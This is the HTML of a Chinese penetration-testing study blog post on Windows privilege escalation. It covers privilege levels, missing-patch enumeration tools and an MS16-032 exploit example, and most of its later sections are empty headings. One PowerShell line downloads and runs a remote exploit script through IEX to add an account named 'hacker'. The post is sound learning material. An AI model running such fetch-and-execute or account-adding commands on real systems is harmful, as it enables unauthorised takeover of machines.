@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    
+    <title>内网学习笔记4-权限提升分析及防御 | RainMaker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+
+    
+        <meta property="algolia:search" data-application-id="T8IRMXQO87" data-api-key="614acade121cd1054c73da7b48c66120" data-index-name="test">
+    
+
+    
+
+    
+
+    
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎮</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1637200696663.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1637200696663.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            valine: {
+                enable: true,
+                appId: "xClBvTvhGrfI2roMnMSLmHUm-gzGzoHsz",
+                appKey: "Qi9SH982uKy3x14sNYdKegyJ",
+            },
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+	
+    <div class="container">
+    <header class="header">
+		<meta name="baidu-site-verification" content="code-YWFjIbmZen" />
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/avatar.jpg" alt="">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>RainMaker</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+                <a href="/friends">Friends</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                    <a href="/friends">Friends</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-ckyj2l1it002xrk4z9hqa1p77" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      内网学习笔记4-权限提升分析及防御
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-01-13T17:58:31.000Z" itemprop="datePublished">2022-01-14</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Priviledge/" rel="tag">Priviledge</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <p>Windows操作系统中，权限大概分为四种，分别是<code>User、Administrator、 System、TrustedInstaller</code>。在这四种权限中，我们经常接触的是前三种。第四种权限 <code>TrustedInstaller </code> 在常规使用中通常会涉及。</p>
+<span id="more"></span>
+
+<ul>
+<li><code>User</code>：普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料）</li>
+<li><code>Administrator</code>：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作SAM文件等。</li>
+<li><code>System</code>：系统权限。可以对SAM等敏感文件进行读取，往往需要将 Administrator 权限提升到System权限才可以对散列值进行Dump操作。</li>
+<li><code>TrustedInstaller</code>：Windows 中的最高权限，对系统文件，即使拥有System权限也无法进行修改。只有拥有 <code>TrustedInstaller</code> 权限的用户才可以修改系统文件。</li>
+</ul>
+<p>Windows操作系统中管理员账号的权限以及Linux操作系统中root账户的权限是操作系统的最高权限。提升权限（也称提权）的方式分为以下两类。 </p>
+<ul>
+<li>纵向提权：低权限角色获得高权限角色的权限。</li>
+</ul>
+<p>​       例如，一个<code>WebShell</code> 权限通过提权，拥有了管理员权限，这种提权就是纵向提权，也称作权限升级 。</p>
+<ul>
+<li>横向提权：获取同级别角色的权限。</li>
+</ul>
+<p>​       例如，在系统A中获取了系统B的权限，这种提权就属于横向提权。常用的提权方法有系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、web中间件漏洞提权、<code>DLL</code>劫持提权、滥用高权限令牌提权、第三方软件/服务提权等。</p>
+<h2 id="4-1-系统内核溢出漏洞提权分析及防范"><a href="#4-1-系统内核溢出漏洞提权分析及防范" class="headerlink" title="4.1 系统内核溢出漏洞提权分析及防范"></a>4.1 系统内核溢出漏洞提权分析及防范</h2><p>​        系统内核溢出漏洞提权是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。攻击者利用该漏洞的关键是目标系统没有及时安装补丁—即使微软已经针对某个漏洞发布了补丁，但如果系统没有立即安装补丁，就会让攻击者有机可乘。然而，这种提权方法也存在一定的局限性—如果目标系统的补丁更新工作较为迅速和完整，那么攻击者要想通过这种方法提权，就必须找出目标系统中的<code>0day</code>漏洞。</p>
+<h3 id="4-1-1-通过手动执行命令发现缺失补丁"><a href="#4-1-1-通过手动执行命令发现缺失补丁" class="headerlink" title="4.1.1 通过手动执行命令发现缺失补丁"></a>4.1.1 通过手动执行命令发现缺失补丁</h3><pre><code class="hljs powershell"><span class="hljs-comment">#查看当前权限</span>
+whoami /groups 
+
+<span class="hljs-comment">#查看系统补丁安装信息</span>
+systeminfo | findstr /C:<span class="hljs-string">&quot;KB&quot;</span> 
+
+<span class="hljs-comment">#通过wmic查看补丁安装信息</span>
+wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
+
+<p>通过手工查找相关补丁是否安装确定是否存在相关漏洞，并加以利用。以<code>MS16-032（KB3139914）</code>漏洞为例：</p>
+<pre><code class="hljs powershell"><span class="hljs-comment">#首先查找是否安装补丁 KB3139914</span>
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KB3139914&quot;</span>
+
+<span class="hljs-comment">#利用powershell脚本 Invoke-MS16-032.ps1，添加用户为 hacker，密码为 abc@123的用户</span>
+<span class="hljs-built_in">Invoke-MS16</span><span class="hljs-literal">-032</span>.ps1 <span class="hljs-literal">-Application</span> cmd.exe <span class="hljs-literal">-Commandline</span> <span class="hljs-string">&quot;/c net user hacker abc@123 /add&quot;</span>
+
+<span class="hljs-comment">#远程加载，之后继续执行命令</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;repo1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-MS16</span><span class="hljs-literal">-032</span>.ps1 <span class="hljs-literal">-Application</span> cmd.exe <span class="hljs-literal">-Commandline</span> <span class="hljs-string">&quot;/c net user hacker abc@123 /add&quot;</span></code></pre>
+
+<p>repo1: <a target="_blank" rel="noopener" href="https://github.com/gezginbekir/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1">https://github.com/gezginbekir/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1</a></p>
+<h3 id="4-1-2-利用Metasploit-发现缺失补丁"><a href="#4-1-2-利用Metasploit-发现缺失补丁" class="headerlink" title="4.1.2 利用Metasploit 发现缺失补丁"></a>4.1.2 利用Metasploit 发现缺失补丁</h3><p>利用Metasploit中的<code>enum_patches</code>模块，可以根据漏洞编号快速找出系统中缺少的补丁。</p>
+<pre><code class="hljs shell">use post/windows/gather/enum_patches</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118003450642.png" alt="image-20220118003450642 "></p>
+<h3 id="4-1-3-Windows-Exploit-Suggester"><a href="#4-1-3-Windows-Exploit-Suggester" class="headerlink" title="4.1.3 Windows Exploit Suggester"></a>4.1.3 Windows Exploit Suggester</h3><p>Gotham Digital Security 发布了—个名为 <code>Windows Exploit Suggester</code> 的工具，该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其需要的只有目标系统的信息。 使用<code>systeminfo</code>命令获取当前系统的补丁安装情况，并将补丁信息导入 <code>patches.txt</code> 文件。</p>
+<p>repo:<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p><code>BulletinSearch.xlsx</code>下载：</p>
+<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982">https://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982</a></p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">安装python依赖指定版本的xlrd，高版本会报错</span>
+pip install xlrd==1.2.0
+<span class="hljs-meta"></span>
+<span class="hljs-meta">#</span><span class="bash">跟新数据库，更新失败就手动下载BulletinSearch.xlsx文件</span>
+python windows-exploit-suggester.py --update
+<span class="hljs-meta"></span>
+<span class="hljs-meta">#</span><span class="bash">搜集window平台的systeminfo信息</span>
+systeminfo &gt; systeminfo.txt
+<span class="hljs-meta"> </span>
+<span class="hljs-meta">#</span><span class="bash">查询</span>
+python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo systeminfo.txt</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118012525617.png" alt="image-20220118012525617"></p>
+<p>看起来效果还可以，不过<code>BulletinSearch.xlsx</code>到2017年3月14日就没有了，可以使用<code>bitsadmin</code>的<code>Windows Exploit Suggester</code>下一代版本，增加了对 Windows 11 等操作系统漏洞和近年来发布的漏洞的检测支持。</p>
+<p>repo:<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p>使用的是<code>definitions.zip</code>作为数据库，手动下载地址：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/bitsadmin/wesng/master/definitions.zip">https://raw.githubusercontent.com/bitsadmin/wesng/master/definitions.zip</a></p>
+<h3 id="4-1-4-PowerShell-中的-Sherlock脚本"><a href="#4-1-4-PowerShell-中的-Sherlock脚本" class="headerlink" title="4.1.4 PowerShell 中的 Sherlock脚本"></a>4.1.4 PowerShell 中的 Sherlock脚本</h3><p>Sherlock 脚本可以快速查找本地特权升级漏洞缺失的软件补丁。</p>
+<p>repo: <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
+<p>支持的漏洞：</p>
+<ul>
+<li>MS10-015：用户模式响铃 (KiTrap0D)</li>
+<li>MS10-092：任务计划程序</li>
+<li>MS13-053：NTUserMessageCall Win32k 内核池溢出</li>
+<li>MS13-081：TrackPopupMenuEx Win32k NULL 页面</li>
+<li>MS14-058：TrackPopupMenu Win32k 空指针取消引用</li>
+<li>MS15-051：ClientCopyImage Win32k</li>
+<li>MS15-078：字体驱动程序缓冲区溢出</li>
+<li>MS16-016：“mrxdav.sys”WebDAV</li>
+<li>MS16-032：辅助登录句柄</li>
+<li>MS16-034：Windows 内核模式驱动程序 EoP</li>
+<li>MS16-135：Win32k 特权提升</li>
+<li>CVE-2017-7199：Nessus Agent 6.6.2 - 6.10.3 Priv Esc</li>
+</ul>
+<p>用法：</p>
+<pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\Sherlock.ps1
+<span class="hljs-comment">#查找所有漏洞</span>
+<span class="hljs-built_in">Find-AllVulns</span></code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220118015405967.png" alt="image-20220118015405967"></p>
+<p>查找单个漏洞，如果不使用CS可能需要修改脚本：</p>
+<pre><code class="hljs powershell"><span class="hljs-comment">#1</span>
+<span class="hljs-built_in">Set-ExploitTable</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span> 
+<span class="hljs-comment">#2  将所有的1下面加一行2即可</span>
+<span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span>)
+<span class="hljs-comment">#查找单个漏洞</span>
+<span class="hljs-built_in">Find-MS14058</span></code></pre>
+
+
+
+<h2 id="4-2-Windows操作系统配置错误利用"><a href="#4-2-Windows操作系统配置错误利用" class="headerlink" title="4.2 Windows操作系统配置错误利用"></a>4.2 Windows操作系统配置错误利用</h2><h3 id="4-2-1-系统服务权限配置错误"><a href="#4-2-1-系统服务权限配置错误" class="headerlink" title="4.2.1 系统服务权限配置错误"></a>4.2.1 系统服务权限配置错误</h3><h3 id="4-2-2-注册表键AlwaysInstallerElevated"><a href="#4-2-2-注册表键AlwaysInstallerElevated" class="headerlink" title="4.2.2 注册表键AlwaysInstallerElevated"></a>4.2.2 注册表键AlwaysInstallerElevated</h3><h3 id="4-2-3-可信任的服务器路径漏洞"><a href="#4-2-3-可信任的服务器路径漏洞" class="headerlink" title="4.2.3 可信任的服务器路径漏洞"></a>4.2.3 可信任的服务器路径漏洞</h3><h3 id="4-2-4-自动安装配置文件"><a href="#4-2-4-自动安装配置文件" class="headerlink" title="4.2.4 自动安装配置文件"></a>4.2.4 自动安装配置文件</h3><h3 id="4-2-5-计划任务"><a href="#4-2-5-计划任务" class="headerlink" title="4.2.5 计划任务"></a>4.2.5 计划任务</h3><h3 id="4-2-6-Empire-内置模块"><a href="#4-2-6-Empire-内置模块" class="headerlink" title="4.2.6 Empire 内置模块"></a>4.2.6 Empire 内置模块</h3><h2 id="4-3-组策略首选项提权分析及防范"><a href="#4-3-组策略首选项提权分析及防范" class="headerlink" title="4.3 组策略首选项提权分析及防范"></a>4.3 组策略首选项提权分析及防范</h2><h2 id="4-4-绕过UAC-提权分析及防范"><a href="#4-4-绕过UAC-提权分析及防范" class="headerlink" title="4.4 绕过UAC 提权分析及防范"></a>4.4 绕过UAC 提权分析及防范</h2><h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><h2 id="4-6-无凭证条件下的权限分析及防范"><a href="#4-6-无凭证条件下的权限分析及防范" class="headerlink" title="4.6 无凭证条件下的权限分析及防范"></a>4.6 无凭证条件下的权限分析及防范</h2>
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
+
+
+    
+
+    
+<nav class="article-nav">
+  
+  
+    <a href="/ddad802f.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">2021-12月CISP-PTE考试总结</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=内网学习笔记4-权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=内网学习笔记4-权限提升分析及防御 - RainMaker&u=http://hasaki-h2.github.io/401ba385.html">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=内网学习笔记4-权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+<script src="./js/busuanzi.pure.mini.js"></script>
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <box-icon name='search' color="#3c4859"></box-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Log4j/" rel="tag">Log4j</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PTE/" rel="tag">PTE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Priviledge/" rel="tag">Priviledge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/401ba385.html">内网学习笔记4-权限提升分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/ddad802f.html">2021-12月CISP-PTE考试总结</a>
+          </li>
+        
+          <li>
+            <a href="/80ca6920.html">记一次SSRF练习</a>
+          </li>
+        
+          <li>
+            <a href="/7209cfed.html">Log4j漏洞内网检测</a>
+          </li>
+        
+          <li>
+            <a href="/f0bfc07b.html">Empire-配置安装和基本使用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            RainMaker &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1637200696663.js"></script>
+
+
+<script src="/dist/custom.js?1637200696663.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+<!-- Baidu Analytics-->
+<script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?df9a1971c34200c9a339305db5b13a60";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+</body>
+
+</html>
